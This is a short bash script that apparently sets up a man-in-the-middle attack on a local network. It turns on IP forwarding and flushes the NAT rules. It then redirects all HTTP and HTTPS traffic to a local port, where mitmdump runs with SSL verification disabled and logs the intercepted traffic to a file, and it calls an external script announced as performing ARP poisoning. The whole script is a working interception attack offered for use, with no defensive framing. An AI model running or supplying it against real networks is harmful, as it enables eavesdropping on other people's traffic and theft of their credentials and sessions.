echo 1 > /proc/sys/net/ipv4/ip_forward
printf "[+] Enabling IP forwarding\n";
iptables -t nat -L > iptables.nat.bkp.txt
iptables -t nat -F
echo "[+] Enter the port number to start proxy."
read port_1
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports $port_1
echo "[+] Port forwarding HTTP traffic to port $port_1"
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports $port_1
echo "[+] Port forwarding HTTPS traffic to port $port_1"
echo "[+] Performing ARP poisoning"
xterm -title MITM_PROXY -e mitmdump -w ssl_mitm_out.txt -p $port_1 --ssl-insecure & $PWD/mitm/mitm.sh; 
